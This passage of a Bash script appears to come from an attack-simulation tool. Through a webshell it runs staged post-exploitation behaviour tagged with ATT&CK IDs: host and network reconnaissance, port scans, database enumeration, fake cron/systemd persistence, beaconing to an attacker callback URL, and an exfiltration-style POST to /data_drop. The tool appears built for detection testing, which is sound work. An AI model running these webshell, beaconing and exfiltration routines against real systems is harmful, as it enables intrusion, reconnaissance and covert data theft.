    if [[ "${cmd_out}" != *"WRITABLE_OK"* && -n "${CUSTOM_RUNTIME_DIR}" ]]; then
        log_message "WARN" "Remote runtime-dir unusable (${REMOTE_RUNTIME_DIR}); applying automatic fallback"
        add_preflight_result "[!] Custom remote runtime-dir unusable; retrying with default /tmp path"
        CUSTOM_RUNTIME_DIR=""
        RUNTIME_FALLBACK_USED=true
        resolve_runtime_dir
        log_message "WARN" "Remote runtime fallback active after custom path failure; using ${REMOTE_RUNTIME_DIR}"
        cmd_out=$(run_webshell_raw "preflight-runtime-writable-retry" "mkdir -p '${REMOTE_RUNTIME_DIR}' && touch '${REMOTE_RUNTIME_DIR}/.preflight_write_test' && echo WRITABLE_OK")
    fi
    if [[ "${cmd_out}" != *"WRITABLE_OK"* ]]; then
        add_preflight_result "[-] Runtime dir not writable on webshell host"
        set_stage_result "Preflight Validation" "Skipped" "Remote runtime not writable: ${REMOTE_RUNTIME_DIR}"
        log_message "ERROR" "Remote runtime dir not writable: ${REMOTE_RUNTIME_DIR}"
        exit 1
    fi
    add_preflight_result "[+] Runtime dir writable"
    set_stage_result "Preflight Validation" "Success"
    write_report_entries "preflight_validation" "T1190" "XDR/NDR/EDR" "Environment Validation" "local+remote" "success" "preflight checks complete"
}

stage_post_assessment_validations() {
    add_executed_stage "Post-Assessment Validation"
    local post_status="Success" post_reasons=()
    if [[ "${DRY_RUN}" == true ]]; then
        add_preflight_result "[+] Callback reachability check planned"
        add_preflight_result "[+] DNS validation planned"
        set_stage_result "Post-Assessment Validation" "Success"
        return 0
    fi
    local status_code cmd_out remote_cb
    build_curl_common_args 4
    status_code=$(curl "${CURL_COMMON_ARGS[@]}" -sS -o /dev/null -w "%{http_code}" "${ATTACKER_BASE_URL}" || true)
    if [[ -n "${status_code}" && "${status_code}" != "000" ]]; then
        add_preflight_result "[+] Callback reachable (${ATTACKER_BASE_URL}, HTTP ${status_code})"
    else
        add_preflight_result "[!] Callback not reachable (continuing)"
        post_status="Partial"
        post_reasons+=("Callback unreachable")
    fi
    local tcp_cb_probe
    tcp_cb_probe=$(build_remote_tcp_probe_cmd "${ATTACKER_IP}" "${ATTACKER_PORT}")
    remote_cb=$(run_webshell_raw "preflight-remote-callback" "curl -s --max-time 3 '${ATTACKER_BASE_URL}' >/dev/null 2>&1 && echo REMOTE_CB_OK || (${tcp_cb_probe} && echo REMOTE_CB_OK || true)")
    if [[ "${remote_cb}" == *"REMOTE_CB_OK"* ]]; then
        add_preflight_result "[+] Remote callback reachable"
    else
        add_preflight_result "[!] Remote callback failed (continuing)"
        post_status="Partial"
        post_reasons+=("Remote callback unreachable")
    fi
    cmd_out=$(run_webshell_raw "preflight-dns" "getent hosts example.com >/dev/null 2>&1 && echo DNS_OK || nslookup example.com >/dev/null 2>&1 && echo DNS_OK || dig +short example.com >/dev/null 2>&1 && echo DNS_OK || ping -c 1 -W 1 example.com >/dev/null 2>&1 && echo DNS_OK || true")
    if [[ "${cmd_out}" == *"DNS_OK"* ]]; then
        add_preflight_result "[+] DNS resolution works"
    else
        add_preflight_result "[!] DNS resolution failed (continuing)"
        post_status="Partial"
        post_reasons+=("DNS validation failed")
    fi
    if ((${#post_reasons[@]} > 0)); then
        local IFS='; '
        set_stage_result "Post-Assessment Validation" "${post_status}" "${post_reasons[*]}"
    else
        set_stage_result "Post-Assessment Validation" "${post_status}"
    fi
}

stage_host_discovery() {
    add_executed_stage "Host Discovery"
    set_stage_result "Host Discovery" "Success"
    write_report_entries "host_discovery" "T1082/T1016/T1049" "EDR/XDR" "Discovery Activity" "localhost" "start" "host reconnaissance"
    run_webshell "host-discovery" "whoami; id; hostname; uname -a; ip addr show 2>/dev/null || ip route 2>/dev/null || ifconfig 2>/dev/null || true; ss -antp 2>/dev/null || netstat -antp 2>/dev/null || true; ps aux 2>/dev/null | head -n 20 || ps -ef 2>/dev/null | head -n 20 || true; env 2>/dev/null | grep -Evi 'token|secret|key|pass|auth|cookie' | head -n 20 || true" >/dev/null
    write_report_entries "host_discovery" "T1082/T1016/T1049" "EDR/XDR" "Discovery Activity" "localhost" "success" "host recon complete"
}

stage_network_discovery() {
    add_executed_stage "Network Discovery"
    write_report_entries "network_discovery" "T1018" "NDR" "Internal IP Scan" "${TARGET_NET}" "start" "icmp sweep"
    if [[ "${HAS_python3:-false}" == true ]]; then
        set_stage_result "Network Discovery" "Success"
        local py
        py=$(cat <<PY
import concurrent.futures, subprocess
prefix = "${NETWORK_PREFIX}"
def ping_node(i):
    subprocess.run(["ping","-c","1","-W","1",f"{prefix}.{i}"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
with concurrent.futures.ThreadPoolExecutor(max_workers=${PING_SWEEP_PARALLELISM}) as ex:
    list(ex.map(ping_node, range(1,255)))
PY
)
        run_remote_python "network-discovery" "${py}"
    else
        set_stage_result "Network Discovery" "Fallback" "python3 missing, shell ping fallback used"
        run_webshell "network-discovery-fallback" "$(build_remote_network_discovery_fallback)" >/dev/null
        if [[ "${REMOTE_XARGS_PARALLEL_SUPPORTED}" == true ]]; then
            add_fallback_usage "Python runtime unavailable: network_discovery used parallel ping fallback (xargs -P)"
        else
            add_fallback_usage "Python runtime unavailable: network_discovery used sequential ping fallback (no xargs -P)"
        fi
    fi
    write_report_entries "network_discovery" "T1018" "NDR" "Internal IP Scan" "${TARGET_NET}" "success" "icmp sweep done"
}

stage_tcp_fanout() {
    add_executed_stage "TCP Fanout"
    write_report_entries "tcp_fanout" "T1046" "NDR" "Scanner Behavior / TRW" "internal" "start" "failed connection ratio stimulation"

    if [[ "${HAS_python3:-false}" == true ]]; then
        local py
        py=$(cat <<PY
import random, socket, time
dead_ips = [f"${NETWORK_PREFIX}.{x}" for x in [199,201,203,205,207]]
ports = [23,25,53,81,110,135,139,143,445,993,995,1433,1521,3306,3389,4444,8081,9000,9443]
for _ in range(240):
    ip = random.choice(dead_ips)
    port = random.choice(ports)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(0.2)
    try:
        s.connect((ip, port))
    except Exception:
        pass
    finally:
        s.close()
    if random.random() < 0.35:
        time.sleep(random.uniform(0.01, 0.12))
PY
)
        run_remote_python "tcp-fanout" "${py}"
        set_stage_result "TCP Fanout" "Success"
        [[ "${VERBOSE}" == true ]] && vlog "tcp_fanout mode=python"
    else
        run_webshell "tcp-fanout-fallback" "
${REMOTE_SHELL_HELPERS}
for ip in 199 201 203 205 207; do
  for p in 23 25 53 81 110 135 139 143 445 993 995 1433 1521 3306 3389 4444 8081 9000 9443; do
    poc_port_probe ${NETWORK_PREFIX}.\${ip} \${p} || true
  done
done
" >/dev/null
        set_stage_result "TCP Fanout" "Fallback" "python3 missing, /dev/tcp fallback used"
        add_fallback_usage "TCP Fanout: python3 missing, /dev/tcp fallback used"
        [[ "${VERBOSE}" == true ]] && vlog "tcp_fanout mode=fallback"
    fi

    write_report_entries "tcp_fanout" "T1046" "NDR" "Scanner Behavior / TRW" "internal" "success" "tcp fanout completed"
}

stage_service_discovery() {
    add_executed_stage "Service Discovery"
    write_report_entries "service_discovery" "T1046" "NDR" "Internal Port Scan" "${TARGET_NET}" "start" "full /24 service discovery"
    run_webshell_quick "init-target-files" \
        "mkdir -p '${REMOTE_RUNTIME_DIR}' && for f in ssh_hosts.txt dns_hosts.txt http_targets.txt https_targets.txt smb_hosts.txt ldap_hosts.txt redis_hosts.txt elastic_hosts.txt mongo_hosts.txt; do : > '${REMOTE_RUNTIME_DIR}'/\$f; done" \
        >/dev/null 2>&1 || true
    rm -rf "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    mkdir -p "${LOCAL_STATE_DIR}/remote_hosts" 2>/dev/null || true
    DISCOVERY_NMAP_INLINE_OK=false

    log_message "OK" "Full /24 discovery on ${TARGET_NET} (nmap=${HAS_nmap:-false} on webshell, chunks of ${DISCOVERY_CHUNK_SIZE})"

    if [[ "${HAS_nmap:-false}" == true ]]; then
        set_stage_result "Service Discovery" "Success" "chunked inline nmap /24"
        run_nmap_discovery_chunked
        count_all_discovered_services >/dev/null
    fi

    if [[ "${HAS_nmap:-false}" != true ]]; then
        set_stage_result "Service Discovery" "Fallback" "chunked TCP probe /24 (nmap absent on webshell)"
        add_fallback_usage "Service discovery: nmap missing on webshell, TCP probe /24"
        run_fallback_discovery_chunked
        count_all_discovered_services >/dev/null
    elif (( SERVICES_DISCOVERED_TOTAL == 0 )); then
        log_message "WARN" "Inline nmap /24 found 0 services — trying TCP probe chunks"
        set_stage_result "Service Discovery" "Fallback" "nmap /24 empty, TCP probe chunks"
        add_fallback_usage "Service discovery: inline nmap /24 empty, TCP probe chunks"
        run_fallback_discovery_chunked
        count_all_discovered_services >/dev/null
    fi

    log_discovery_diagnostics
    record_discovered_services_snapshot
    write_report_entries "service_discovery" "T1046" "NDR" "Internal Port Scan" "${TARGET_NET}" "success" "service map total=${SERVICES_DISCOVERED_TOTAL}"
}

run_post_discovery_pipeline() {
    local include_windows="${1:-true}"
    local include_process="${2:-false}"
    pipeline_stop_requested && return 130
    count_all_discovered_services >/dev/null
    stage_validate_discovered_services_usable || true
    stage_adaptive_operator_followup
    apply_followup_intensity_defaults
    execute_jitter
    stage_mandatory_service_followups
    if [[ "${PIPELINE_OVERLAP}" == true ]]; then
        run_followup_stages_adaptive "${include_windows}" true
    else
        run_followup_stages_adaptive "${include_windows}" false
    fi
    stage_service_spike_burst
    stage_followup_validation || pipeline_stop_requested && return 130
    if [[ "${include_process}" == true ]]; then
        run_pipeline_stage "Process Chain" stage_realistic_process_chains
        run_pipeline_stage "Persistence Simulation" stage_persistence_simulation
    fi
}

stage_ssh_followup() {
    followup_stage_ssh
}

stage_redis_followup() {
    local nodes target redis_status="Success" redis_reason=""
    nodes=$(get_local_hosts "redis_hosts.txt")
    if [[ -z "${nodes}" ]]; then
        add_skipped_stage "Redis Follow-up" "No Redis targets discovered"
        set_stage_result "Redis Follow-up" "Skipped" "No Redis targets discovered"
        return 0
    fi
    add_executed_stage "Redis Follow-up"
    write_report_entries "redis_followup" "T1046" "NDR" "Redis Recon" "multi" "start" "redis ping/info"
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        if [[ "${HAS_redis_cli:-false}" == true ]]; then
            run_webshell "redis-followup-${target}" "redis-cli -h ${target} PING >/dev/null 2>&1 || true; redis-cli -h ${target} INFO >/dev/null 2>&1 || true" >/dev/null
        else
            local tcp_redis_probe
            tcp_redis_probe=$(build_remote_tcp_probe "${target}" 6379)
            run_webshell "redis-followup-fallback-${target}" "${REMOTE_SHELL_HELPERS} ${tcp_redis_probe}" >/dev/null
            redis_status="Fallback"
            redis_reason="redis-cli missing, TCP/6379 fallback used"
            add_fallback_usage "Redis follow-up: TCP/6379 fallback used"
        fi
    done <<< "${nodes}"
    set_stage_result "Redis Follow-up" "${redis_status}" "${redis_reason}"
    write_report_entries "redis_followup" "T1046" "NDR" "Redis Recon" "multi" "success" "redis follow-up completed"
}

stage_elastic_followup() {
    local nodes target elastic_status="Success" elastic_reason=""
    nodes=$(get_local_hosts "elastic_hosts.txt")
    if [[ -z "${nodes}" ]]; then
        add_skipped_stage "Elastic Follow-up" "No Elasticsearch targets discovered"
        set_stage_result "Elastic Follow-up" "Skipped" "No Elasticsearch targets discovered"
        return 0
    fi
    add_executed_stage "Elastic Follow-up"
    write_report_entries "elastic_followup" "T1046" "NDR/SIEM" "Elasticsearch Enumeration" "multi" "start" "elastic root/indices"
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        if [[ "${HAS_curl:-false}" == true ]]; then
            run_webshell "elastic-followup-${target}" "curl -s --max-time 2 http://${target}:9200/ >/dev/null 2>&1 || true; curl -s --max-time 2 http://${target}:9200/_cat/indices >/dev/null 2>&1 || true" >/dev/null
        else
            local tcp_elastic_probe
            tcp_elastic_probe=$(build_remote_tcp_probe "${target}" 9200)
            run_webshell "elastic-followup-fallback-${target}" "${REMOTE_SHELL_HELPERS} ${tcp_elastic_probe}" >/dev/null
            elastic_status="Fallback"
            elastic_reason="curl missing, TCP/9200 fallback used"
            add_fallback_usage "Elastic follow-up: TCP/9200 fallback used"
        fi
    done <<< "${nodes}"
    set_stage_result "Elastic Follow-up" "${elastic_status}" "${elastic_reason}"
    write_report_entries "elastic_followup" "T1046" "NDR/SIEM" "Elasticsearch Enumeration" "multi" "success" "elastic follow-up completed"
}

stage_mongo_followup() {
    local nodes target mongo_status="Success" mongo_reason=""
    nodes=$(get_local_hosts "mongo_hosts.txt")
    if [[ -z "${nodes}" ]]; then
        add_skipped_stage "Mongo Follow-up" "No MongoDB targets discovered"
        set_stage_result "Mongo Follow-up" "Skipped" "No MongoDB targets discovered"
        return 0
    fi
    add_executed_stage "Mongo Follow-up"
    write_report_entries "mongo_followup" "T1046" "NDR" "MongoDB Enumeration" "multi" "start" "mongo connection/db list"
    while IFS= read -r target; do
        [[ -z "${target}" ]] && continue
        if [[ "${HAS_mongosh:-false}" == true ]]; then
            run_webshell "mongo-followup-${target}" "mongosh --host ${target} --port 27017 --quiet --eval 'show dbs' >/dev/null 2>&1 || true" >/dev/null
        elif [[ "${HAS_mongo:-false}" == true ]]; then
            run_webshell "mongo-followup-legacy-${target}" "mongo --host ${target} --port 27017 --quiet --eval 'show dbs' >/dev/null 2>&1 || true" >/dev/null
        else
            local tcp_mongo_probe
            tcp_mongo_probe=$(build_remote_tcp_probe "${target}" 27017)
            run_webshell "mongo-followup-fallback-${target}" "${REMOTE_SHELL_HELPERS} ${tcp_mongo_probe}" >/dev/null
            mongo_status="Fallback"
            mongo_reason="mongosh/mongo missing, TCP/27017 fallback used"
            add_fallback_usage "Mongo follow-up: TCP/27017 fallback used"
        fi
    done <<< "${nodes}"
    set_stage_result "Mongo Follow-up" "${mongo_status}" "${mongo_reason}"
    write_report_entries "mongo_followup" "T1046" "NDR" "MongoDB Enumeration" "multi" "success" "mongo follow-up completed"
}

stage_http_followup() {
    followup_stage_http
}

stage_windows_telemetry() {
    followup_stage_smb
}

stage_dns_tunnel_simulation() {
    followup_stage_dns
}

stage_beaconing() {
    add_executed_stage "Beaconing"
    write_report_entries "beaconing" "T1071.001" "NDR/EDR" "Beaconing" "${ATTACKER_BASE_URL}" "start" "mixed callback behavior"
    local uas paths methods i ua p m reqid sess jitter remote_curl beacon_status="Success" beacon_reason="" out
    local attacker_host attacker_port req body raw_req xff
    local xff_refs=("10.0.0.22" "10.0.0.33" "10.0.0.44" "10.0.0.55" "172.16.0.10")
    uas=("Symphony/2.4.1-TelemetryCollector" "Mozilla/5.0 CobaltClient/4.8" "TelemetryAgent/1.1" "curl/8.5.0" "Go-http-client/1.1")
    paths=("${CALLBACK_PREFIX}/check-in" "${CALLBACK_PREFIX}/metrics" "${CALLBACK_PREFIX}/sync" "/favicon.ico" "/cdn/status" "/update/check" "/api/ping")
    methods=("GET" "POST" "HEAD")
    attacker_host="${ATTACKER_BASE_URL#http://}"
    attacker_host="${attacker_host%%:*}"
    attacker_port="${ATTACKER_BASE_URL##*:}"
    if [[ "${DRY_RUN}" == true ]]; then
        beacon_status="Success"
    elif [[ "${HAS_curl:-false}" != true ]]; then
        beacon_status="Fallback"
        beacon_reason="remote curl missing, raw HTTP fallback used"
        add_fallback_usage "${beacon_reason}"
    fi
    for ((i=1; i<=BEACON_COUNT; i++)); do
        ua="${uas[RANDOM % ${#uas[@]}]}"; p="${paths[RANDOM % ${#paths[@]}]}"; m="${methods[RANDOM % ${#methods[@]}]}"
        reqid="${RANDOM}-${RANDOM}-${i}"; sess="ssn-${CAMPAIGN_ID}-${RANDOM}"
        xff="${xff_refs[RANDOM % ${#xff_refs[@]}]}"
        increment_beacon_attempt
        build_curl_common_args 3
        local -a curl_args=("${CURL_COMMON_ARGS[@]}" --request "${m}" --user-agent "${ua}"
            -H "X-Request-ID: ${reqid}" -H "X-Session-ID: ${sess}"
            -H "X-Forwarded-For: ${xff}"
            -H "Referer: https://cdn.example.com/status" -H "X-Original-URL: ${p}"
            -H "Accept: */*" -H "Connection: keep-alive")
        append_curl_telemetry_headers curl_args
        if (( RANDOM % 3 == 0 )); then
            curl_args+=(--data-urlencode "result=ok" --data-urlencode "campaign=${CAMPAIGN_ID}")
        fi
        curl_args+=("${ATTACKER_BASE_URL}${p}?node=${i}&j=${RANDOM}&sid=${sess}")
        if [[ "${HAS_curl:-false}" == true ]]; then
            remote_curl=$(build_remote_curl_invocation "${curl_args[@]}")
            out=$(run_webshell "beacon-${i}" "${remote_curl} >/dev/null 2>&1 && echo BEACON_OK || echo BEACON_FAIL")
        else
            req="${p}?node=${i}&j=${RANDOM}&sid=${sess}"
            body=""
            if [[ "${m}" == "POST" ]]; then
                body="result=ok&campaign=${CAMPAIGN_ID}"
            fi
            raw_req="${m} ${req} HTTP/1.1\r\nHost: ${attacker_host}:${attacker_port}\r\nUser-Agent: ${ua}\r\nX-PoC-Campaign: ${CAMPAIGN_ID}\r\nX-Operator: StellarPoC\r\nX-Request-ID: ${reqid}\r\nX-Session-ID: ${sess}\r\nX-Forwarded-For: ${xff}\r\nReferer: https://cdn.example.com/status\r\nConnection: keep-alive\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${#body}\r\n\r\n${body}"
            out=$(run_webshell "beacon-raw-${i}" "${REMOTE_SHELL_HELPERS} poc_http_send '${attacker_host}' '${attacker_port}' \"${raw_req}\" >/dev/null 2>&1 && echo BEACON_OK || echo BEACON_FAIL")
        fi
        if [[ "${out}" == *"BEACON_OK"* ]]; then
            increment_beacon_success
            increment_beacon_count
        fi
        jitter=$(awk -v min="0.35" -v max="2.8" 'BEGIN{srand(); printf "%.2f\n", min + rand()*(max-min)}')
        [[ "${DRY_RUN}" == false ]] && sleep "${jitter}"
    done
    if [[ "${HAS_curl:-false}" == true ]]; then
        build_curl_common_args 3
        run_webshell "beacon-404" "$(build_remote_curl_invocation "${CURL_COMMON_ARGS[@]}" "${ATTACKER_BASE_URL}/404-${CAMPAIGN_ID}") >/dev/null 2>&1 || true" >/dev/null
    elif [[ "${DRY_RUN}" == false ]]; then
        raw_req="GET /404-${CAMPAIGN_ID} HTTP/1.1\r\nHost: ${attacker_host}:${attacker_port}\r\nConnection: close\r\n\r\n"
        run_webshell "beacon-404-raw" "${REMOTE_SHELL_HELPERS} poc_http_send '${attacker_host}' '${attacker_port}' \"${raw_req}\" >/dev/null 2>&1 || true" >/dev/null
    fi
    set_stage_result "Beaconing" "${beacon_status}" "${beacon_reason}"
    write_report_entries "beaconing" "T1071.001" "NDR/EDR" "Beaconing" "${ATTACKER_BASE_URL}" "Success" "beaconing done"
}

stage_realistic_process_chains() {
    add_executed_stage "Process Chain"
    local proc_status="Success" proc_reason=""
    write_report_entries "process_chain" "T1059.004" "EDR" "Abnormal Parent Child" "localhost" "start" "harmless process chains"
    if [[ "${HAS_python3:-false}" == true && "${HAS_curl:-false}" == true ]]; then
        run_webshell "proc-chain-1" "sh -c 'echo java/tomcat >/dev/null; curl -s http://127.0.0.1/ >/dev/null 2>&1 || true; python3 - <<\"PY\" >/dev/null 2>&1 || true
print(\"safe chain\")
PY'" >/dev/null
        run_webshell "proc-chain-2" "${REMOTE_SHELL_HELPERS} tar -cf - '${REMOTE_RUNTIME_DIR}' 2>/dev/null | b64_nw | head -n 1 >/dev/null; curl -s --max-time 2 '${ATTACKER_BASE_URL}/artifact?c=${CAMPAIGN_ID}' >/dev/null 2>&1 || true" >/dev/null
    elif [[ "${HAS_curl:-false}" == true ]]; then
        proc_status="Partial"
        proc_reason="python3 missing, shell-only process chain used"
        run_webshell "proc-chain-fallback-shell" "sh -c 'echo sh-chain >/dev/null; curl -s --max-time 2 http://127.0.0.1/ >/dev/null 2>&1 || true; ps 2>/dev/null | head -n 5 >/dev/null || true'" >/dev/null
    else
        proc_status="Fallback"
        proc_reason="curl/python3 missing, minimal process chain used"
        run_webshell "proc-chain-minimal" "sh -c 'echo minimal-chain >/dev/null; ps 2>/dev/null | head -n 3 >/dev/null || true'" >/dev/null
    fi
    set_stage_result "Process Chain" "${proc_status}" "${proc_reason}"
    write_report_entries "process_chain" "T1059.004" "EDR" "Abnormal Parent Child" "localhost" "success" "process chain done"
}

stage_persistence_simulation() {
    add_executed_stage "Persistence Simulation"
    set_stage_result "Persistence Simulation" "Success"
    write_report_entries "persistence_simulation" "T1053.005" "EDR" "Persistence-like Artifact" "localhost" "start" "fake persistence files"
    run_webshell "persistence-fake" "mkdir -p '${REMOTE_FAKE_DIR}'; echo '*/10 * * * * /bin/bash ${REMOTE_RUNTIME_DIR}/beacon.sh' > '${REMOTE_FAKE_DIR}/cron.txt'; printf '[Unit]\nDescription=System Update\n[Service]\nExecStart=/bin/bash ${REMOTE_RUNTIME_DIR}/update.sh\n' > '${REMOTE_FAKE_DIR}/system-update.service'" >/dev/null
    write_report_entries "persistence_simulation" "T1053.005" "EDR" "Persistence-like Artifact" "localhost" "success" "fake persistence created"
}

stage_exfil_simulation() {
    add_executed_stage "Exfiltration Simulation"
    local exfil_status="Success" exfil_reason="" entropy remote_curl out body raw_req attacker_host attacker_port
    write_report_entries "exfiltration" "T1048.003" "NDR/SIEM" "Exfiltration" "${ATTACKER_BASE_URL}" "start" "safe exfil-like post"
    entropy=$(generate_random_base64 64)
    attacker_host="${ATTACKER_BASE_URL#http://}"
    attacker_host="${attacker_host%%:*}"
    attacker_port="${ATTACKER_BASE_URL##*:}"
    if [[ "${DRY_RUN}" == true ]]; then
        set_stage_result "Exfiltration Simulation" "Success"
        write_report_entries "exfiltration" "T1048.003" "NDR/SIEM" "Exfiltration" "${ATTACKER_BASE_URL}" "Success" "exfil simulation (dry-run)"
        return 0
    fi
    increment_exfil_attempt
    if [[ "${HAS_curl:-false}" != true ]]; then
        exfil_status="Fallback"
        exfil_reason="remote curl missing, raw HTTP fallback used"
        add_fallback_usage "${exfil_reason}"
        body="campaign=${CAMPAIGN_ID}&telemetry=harmless-exfil-marker&entropy=base64-${entropy}"
        raw_req="POST /data_drop HTTP/1.1\r\nHost: ${attacker_host}:${attacker_port}\r\nUser-Agent: TelemetryAgent/1.1\r\nX-PoC-Campaign: ${CAMPAIGN_ID}\r\nX-Operator: StellarPoC\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${#body}\r\nConnection: close\r\n\r\n${body}"
        out=$(run_webshell "exfiltration-raw" "${REMOTE_SHELL_HELPERS} poc_http_send '${attacker_host}' '${attacker_port}' \"${raw_req}\" >/dev/null 2>&1 && echo EXFIL_OK || echo EXFIL_FAIL")
        if [[ "${out}" == *"EXFIL_OK"* ]]; then
            increment_exfil_success
            increment_exfil_count
        fi
        set_stage_result "Exfiltration Simulation" "${exfil_status}" "${exfil_reason}"
        write_report_entries "exfiltration" "T1048.003" "NDR/SIEM" "Exfiltration" "${ATTACKER_BASE_URL}" "Fallback" "remote curl fallback"
        return 0
    fi
    build_curl_common_args 5
    local -a curl_args=("${CURL_COMMON_ARGS[@]}" --request POST
        -H "Content-Type: application/octet-stream"
        -H "Accept: */*"
        --data-urlencode "campaign=${CAMPAIGN_ID}" --data-urlencode "telemetry=harmless-exfil-marker"
        --data-urlencode "entropy=base64-${entropy}" "${ATTACKER_BASE_URL}/data_drop")
    append_curl_telemetry_headers curl_args
    remote_curl=$(build_remote_curl_invocation "${curl_args[@]}")
    out=$(run_webshell "exfiltration" "${remote_curl} >/dev/null 2>&1 && echo EXFIL_OK || echo EXFIL_FAIL")
    if [[ "${out}" == *"EXFIL_OK"* ]]; then
        increment_exfil_success
        increment_exfil_count
    fi
    set_stage_result "Exfiltration Simulation" "${exfil_status}" "${exfil_reason}"
    write_report_entries "exfiltration" "T1048.003" "NDR/SIEM" "Exfiltration" "${ATTACKER_BASE_URL}" "Success" "exfil simulation done"
}

stage_cleanup_simulation() {
    if [[ "${KEEP_ARTIFACTS}" == true ]]; then
        add_skipped_stage "Cleanup Simulation" "Artifacts preserved by --keep-artifacts"
        add_fallback_usage "Artifacts preserved in runtime directory"
        set_stage_result "Cleanup Simulation" "Skipped" "Artifacts preserved by option"
        return 0
    fi
    add_executed_stage "Cleanup Simulation"
    set_stage_result "Cleanup Simulation" "Success"
    write_report_entries "cleanup" "T1070" "EDR" "Runtime Cleanup" "localhost" "start" "cleanup runtime only"
    local cleanup_cmd
    cleanup_cmd=$(safe_remote_cleanup_stage_artifacts) || return 0
    run_webshell "cleanup" "${cleanup_cmd}" >/dev/null
    write_report_entries "cleanup" "T1070" "EDR" "Runtime Cleanup" "localhost" "success" "cleanup complete"
}

run_dns_and_beacon_stages() {
    if [[ "${OVERLAP_DNS_STARTED}" != true ]]; then
        stage_dns_tunnel_simulation
    fi
    execute_jitter
    if [[ "${OVERLAP_BEACON_STARTED}" != true ]]; then
        stage_beaconing
    fi
    execute_jitter
}

start_overlap_if_enabled() {
    if overlap_will_execute; then
        add_fallback_usage "Overlap enabled: beacon + dns stages running in background"
        if [[ "${VERBOSE}" == true ]]; then
            echo "[+] Starting overlap stage: beaconing"
        fi
        OVERLAP_BEACON_STARTED=true
        stage_beaconing & OVERLAP_PIDS+=("$!")
        if [[ "${VERBOSE}" == true ]]; then
            echo "[+] Overlap PID: ${OVERLAP_PIDS[-1]}"
            echo "[+] Starting overlap stage: dns_tunnel"
        fi
        OVERLAP_DNS_STARTED=true
        stage_dns_tunnel_simulation & OVERLAP_PIDS+=("$!")
        if [[ "${VERBOSE}" == true ]]; then
            echo "[+] Overlap PID: ${OVERLAP_PIDS[-1]}"
        fi
    fi
}

log_cycle_start() {
    local ts
    ts=$(date -u +"%Y-%m-%dT%H:%M:%SZ" 2>/dev/null || date +"%Y-%m-%dT%H:%M:%SZ")
    log_message "STAGE" "Pipeline cycle ${CURRENT_CYCLE} starting (${MODE}; $(pipeline_schedule_description))"
    state_append "cycle_log.log" "cycle=${CURRENT_CYCLE} started at ${ts}"
    if [[ "${DRY_RUN}" != true && -n "${TIMELINE_LOG}" ]]; then
        safe_append_file "${TIMELINE_LOG}" "${ts} campaign=${CAMPAIGN_ID} cycle=${CURRENT_CYCLE} event=cycle_start mode=${MODE}"
    fi
}

sleep_between_pipeline_cycles() {
    [[ "${DRY_RUN}" == true ]] && return 0
    pipeline_stop_requested && return 130
    log_message "OK" "Cycle sleep ${PIPELINE_CYCLE_SLEEP}s before next pipeline cycle"
    interruptible_sleep "${PIPELINE_CYCLE_SLEEP}" || return 130
}

run_selected_pipeline_once() {
    pipeline_stop_requested && return 130
    pause_pipeline_background_workers
    OVERLAP_BEACON_STARTED=false
    OVERLAP_DNS_STARTED=false
    OVERLAP_PIDS=()
    PIPELINE_OVERLAP_PIDS=()
    stage_burst_activity
    case "${MODE}" in
        quick)
            start_overlap_if_enabled
            run_pipeline_stage "Initial Foothold" stage_initial_foothold
            run_pipeline_stage "Host Discovery" stage_host_discovery
            run_pipeline_stage "Network Discovery" stage_network_discovery
            run_pipeline_stage "Service Discovery" stage_service_discovery
            run_pipeline_stage "TCP Fanout" stage_tcp_fanout
            run_post_discovery_pipeline false false
            if ! overlap_will_execute; then
                run_stage_safe "DNS Tunnel" stage_dns_tunnel_simulation
                execute_jitter
                run_stage_safe "Beaconing" stage_beaconing
                execute_jitter
            fi
            run_stage_safe "Exfiltration Simulation" stage_exfil_simulation
            wait_overlap_jobs
            wait_all_humanize_workers
            ;;
        balanced|full)
            start_overlap_if_enabled
            run_pipeline_stage "Initial Foothold" stage_initial_foothold
            run_pipeline_stage "Host Discovery" stage_host_discovery
            run_pipeline_stage "Network Discovery" stage_network_discovery
            run_pipeline_stage "Service Discovery" stage_service_discovery
            run_pipeline_stage "TCP Fanout" stage_tcp_fanout
            run_post_discovery_pipeline true true
            if ! overlap_will_execute; then
                run_stage_safe "DNS Tunnel" stage_dns_tunnel_simulation
                execute_jitter
                run_stage_safe "Beaconing" stage_beaconing
                execute_jitter
            fi
            run_stage_safe "Exfiltration Simulation" stage_exfil_simulation
            wait_overlap_jobs
            wait_all_humanize_workers
            ;;
        *)
            log_message "ERROR" "Unknown mode in run_selected_pipeline_once: ${MODE}"
            exit 1
            ;;
    esac
    resume_pipeline_background_workers
}

print_repeat_execution_plan() {
    cat <<EOF
[PIPELINE REPETITION PLAN]
- Schedule: $(pipeline_schedule_description)
- Mode/Profile: ${MODE}/${PROFILE}
- Attacker callback: ${ATTACKER_BASE_URL}${CALLBACK_PREFIX}
- Beacon count: ${BEACON_COUNT}
- DNS query count: ${DNS_QUERY_COUNT}
- HTTP repeat: ${HTTP_SCAN_REPEAT}
- SSH fail count: ${SSH_FAIL_COUNT}
- Dry-run: no remote execution; plan only
EOF
    if [[ "${REPEAT_COUNT}" =~ ^[0-9]+$ && "${REPEAT_COUNT}" -gt 0 ]]; then
        echo "- Planned cycles: ${REPEAT_COUNT} (cycles 1..${REPEAT_COUNT})"
    elif [[ "${DURATION_MINUTES}" =~ ^[0-9]+$ && "${DURATION_MINUTES}" -gt 0 ]]; then
        echo "- Planned duration: ${DURATION_MINUTES} minute(s) (until wall-clock end)"
    fi
}

run_pipeline_repeat_count_mode() {
    local i
    for ((i = 1; i <= REPEAT_COUNT; i++)); do
        pipeline_stop_requested && break
        CURRENT_CYCLE="${i}"
        log_cycle_start
        run_selected_pipeline_once || pipeline_stop_requested && break
        TOTAL_CYCLES_COMPLETED="${i}"
        if (( i < REPEAT_COUNT )); then
            sleep_between_pipeline_cycles || break
        fi
    done
}

run_pipeline_duration_mode() {
    local start_epoch end_epoch now
    start_epoch=$(date +%s)
    end_epoch=$((start_epoch + DURATION_MINUTES * 60))
    CURRENT_CYCLE=0
    while :; do
        pipeline_stop_requested && break
        now=$(date +%s)
        if (( now >= end_epoch )); then
            break
        fi
        CURRENT_CYCLE=$((CURRENT_CYCLE + 1))
